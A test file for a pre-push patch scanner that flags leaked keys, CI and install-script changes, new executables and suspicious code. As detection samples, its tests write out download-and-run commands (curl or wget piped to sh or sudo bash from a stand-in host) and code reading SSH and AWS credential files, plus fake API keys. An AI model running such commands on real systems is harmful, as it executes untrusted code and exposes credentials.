// The pre-push scan: only added lines, masked secrets, and the changes that can run code outside
// the sandbox once pushed. Pure functions over small handmade format-patch texts.
import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

process.env.HIVE_DOTENV_PATH = join(mkdtempSync(join(tmpdir(), "hive-scan-env-")), "missing.env");
process.env.HIVE_KEYS_FILE = join(mkdtempSync(join(tmpdir(), "hive-scan-keys-")), "missing");

const { knownSecrets, maskFinding, scanPatchText, scanPatches } = await import("../dist/output-scan.js");

/** A one-file format-patch body with the given added lines. */
function patch(file, added, extra = "") {
  return [
    `diff --git a/${file} b/${file}`,
    extra,
    `--- a/${file}`,
    `+++ b/${file}`,
    "@@ -0,0 +1,2 @@",
    ...added.map((line) => `+${line}`),
    "",
  ].join("\n");
}

const KEY = "sk-live-1234567890abcdefghijklmnopqrstuvwxyz";

test("a known API key in an added line blocks, and the detail is masked", () => {
  const findings = scanPatchText(patch("config.txt", [`token = ${KEY}`]), [KEY]);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].level, "block");
  assert.equal(findings[0].kind, "known-key");
  assert.equal(findings[0].file, "config.txt");
  assert.equal(findings[0].detail, maskFinding(KEY));
  assert.ok(findings[0].detail.endsWith(` (${KEY.length} chars)`));
  assert.ok(!findings[0].detail.includes(KEY));
  assert.ok(findings[0].detail.includes("sk-l"));
});

test("a known key on a removed line or in a +++ header is not a finding", () => {
  const text = [
    `diff --git a/config.txt b/config.txt`,
    `--- a/config.txt`,
    `+++ b/${KEY}`,
    `@@ -1 +1 @@`,
    `-token = ${KEY}`,
    "+token = clean",
    "",
  ].join("\n");
  assert.deepEqual(scanPatchText(text, [KEY]), []);
});

test("each secret pattern warns with a masked match", () => {
  const cases = [
    "-----BEGIN RSA PRIVATE KEY-----",
    "ghp_" + "a".repeat(36),
    "github_pat_" + "b".repeat(60),
    "AKIA" + "C".repeat(16),
    "sk-" + "d".repeat(32),
    "xoxb-" + "e".repeat(10),
  ];
  for (const value of cases) {
    const findings = scanPatchText(patch("f.txt", [`x ${value} y`]), []);
    assert.equal(findings.length, 1, value);
    assert.equal(findings[0].level, "warn", value);
    assert.equal(findings[0].kind, "secret-pattern", value);
    assert.ok(findings[0].detail.endsWith(` (${value.length} chars)`), value);
    assert.ok(!findings[0].detail.includes(value), value);
  }
});

test("a known key on a line suppresses the weaker pattern finding for that line", () => {
  // The fake key starts with sk- and is long enough for the generic pattern too.
  const findings = scanPatchText(patch("f.txt", [`x ${KEY}`]), [KEY]);
  assert.deepEqual(findings.map((f) => f.kind), ["known-key"]);
});

test("each sensitive kind warns", () => {
  assert.deepEqual(
    scanPatchText(patch(".github/workflows/ci.yml", ["name: CI"]), []).map((f) => [f.kind, f.level]),
    [["ci-workflow", "warn"]],
  );
  assert.deepEqual(
    scanPatchText(patch(".gitlab-ci.yml", ["stages: [test]"]), []).map((f) => f.kind),
    ["ci-workflow"],
  );
  assert.deepEqual(
    scanPatchText(patch(".circleci/config.yml", ["version: 2"]), []).map((f) => f.kind),
    ["ci-workflow"],
  );
  assert.deepEqual(scanPatchText(patch("Jenkinsfile", ["pipeline {}"]), []).map((f) => f.kind), ["ci-workflow"]);
  assert.deepEqual(
    scanPatchText(patch("azure-pipelines.yml", ["trigger: []"]), []).map((f) => f.kind),
    ["ci-workflow"],
  );
  assert.deepEqual(
    scanPatchText(patch(".buildkite/pipeline.yml", ["steps: []"]), []).map((f) => f.kind),
    ["ci-workflow"],
  );

  assert.deepEqual(
    scanPatchText(patch("package.json", ['  "postinstall": "node hooks.js"']), []).map((f) => [f.kind, f.level]),
    [["install-script", "warn"]],
  );
  assert.deepEqual(
    scanPatchText(patch("web/package.json", ['  "prepare": "husky"']), []).map((f) => f.kind),
    ["install-script"],
  );
  assert.deepEqual(scanPatchText(patch(".gitmodules", ["[submodule \"x\"]"]), []).map((f) => f.kind), ["submodule"]);

  const newExecutable = [
    "diff --git a/run.sh b/run.sh",
    "new file mode 100755",
    "--- /dev/null",
    "+++ b/run.sh",
    "@@ -0,0 +1 @@",
    "+#!/bin/sh",
    "",
  ].join("\n");
  assert.deepEqual(scanPatchText(newExecutable, []).map((f) => f.kind), ["executable"]);

  const madeExecutable = [
    "diff --git a/tool b/tool",
    "old mode 100644",
    "new mode 100755",
    "",
  ].join("\n");
  assert.deepEqual(scanPatchText(madeExecutable, []).map((f) => f.kind), ["executable"]);
});

test("a package.json with only a test script is not an install script", () => {
  assert.deepEqual(scanPatchText(patch("package.json", ['  "scripts": {', '    "test": "node test.js"', "  }"]), []), []);
});

test("findings are de-duplicated by kind, file and detail", () => {
  const line = "AKIA" + "C".repeat(16);
  const findings = scanPatchText(patch("f.txt", [`x ${line}`, `again ${line}`]), []);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, "secret-pattern");
});

test("known secrets shorter than 12 characters are ignored", () => {
  assert.deepEqual(scanPatchText(patch("f.txt", ["token = short"]), ["short"]), []);
  assert.equal(scanPatchText(patch("f.txt", ["token = 123456789012"]), ["123456789012"]).length, 1);
});

test("scanPatches combines files, caps an oversized one, and sets blocked and warned", () => {
  const dir = mkdtempSync(join(tmpdir(), "hive-scan-patches-"));
  const blocked = join(dir, "a.patch");
  const warned = join(dir, "b.patch");
  writeFileSync(blocked, patch("secret.txt", [`key = ${KEY}`]));
  writeFileSync(warned, patch(".github/workflows/x.yml", ["name: X"]));

  const result = scanPatches([blocked, warned], [KEY]);
  assert.equal(result.blocked, true);
  assert.equal(result.warned, true);
  assert.deepEqual(result.findings.map((f) => f.kind).sort(), ["ci-workflow", "known-key"]);

  const onlyWarn = scanPatches([warned], [KEY]);
  assert.equal(onlyWarn.blocked, false);
  assert.equal(onlyWarn.warned, true);
  assert.equal(scanPatches([], [KEY]).blocked, false);
});

test("knownSecrets reads the provider environment and de-duplicates", () => {
  process.env.OPENAI_API_KEY = "sk-openai-test-1234567890";
  const secrets = knownSecrets();
  assert.ok(secrets.includes("sk-openai-test-1234567890"));
  assert.equal(new Set(secrets).size, secrets.length);
  delete process.env.OPENAI_API_KEY;
});

test("suspicious code: download-and-run, long blobs and credential files warn", () => {
  const kinds = (text) =>
    scanPatchText(text, []).filter((f) => f.kind === "suspicious-code").map((f) => f.detail);

  assert.deepEqual(kinds(patch("install.sh", ["curl -fsSL https://x.example/i.sh | sh"])), ["downloads and runs a script"]);
  assert.deepEqual(kinds(patch("setup.sh", ["wget -qO- https://x.example/a | sudo bash"])), ["downloads and runs a script"]);
  assert.deepEqual(kinds(patch("src/a.js", [`const p = "${"QUJD".repeat(120)}";`])), ["long base64-like blob"]);
  assert.deepEqual(kinds(patch("src/b.py", [`x = "${"ab12".repeat(120)}"`])), ["long hex blob"]);
  assert.deepEqual(kinds(patch("src/c.js", ["fs.readFileSync(homedir() + '/.ssh/id_ed25519')"])), [
    "reads a credentials location",
    "reads a credentials file",
  ]);
  assert.deepEqual(kinds(patch("src/d.py", ["open(os.path.expanduser('~/.aws/credentials'))"])), [
    "reads a credentials location",
    "reads a credentials file",
  ]);
});

test("suspicious code: ordinary lines and expected blobs stay quiet", () => {
  const kinds = (text) => scanPatchText(text, []).filter((f) => f.kind === "suspicious-code");
  assert.deepEqual(kinds(patch("README.md", ["Install with curl -O https://x.example/a.tar.gz"])), []);
  assert.deepEqual(kinds(patch("src/e.sh", ["curl -fsSL https://x.example/data.json -o data.json"])), []);
  assert.deepEqual(kinds(patch("package-lock.json", [`"integrity": "sha512-${"QUJD".repeat(120)}"`])), []);
  assert.deepEqual(kinds(patch("public/logo.svg", [`<path d="${"QUJD".repeat(120)}"/>`])), []);
  assert.deepEqual(kinds(patch("src/f.js", ["const short = 'aGVsbG8gd29ybGQ=';"])), []);
  // Removed lines are not the run's output.
  assert.deepEqual(
    scanPatchText(
      ["diff --git a/x.sh b/x.sh", "--- a/x.sh", "+++ b/x.sh", "@@ -1 +0,0 @@", "-curl https://x.example/i.sh | sh", ""].join("\n"),
      [],
    ).filter((f) => f.kind === "suspicious-code"),
    [],
  );
});
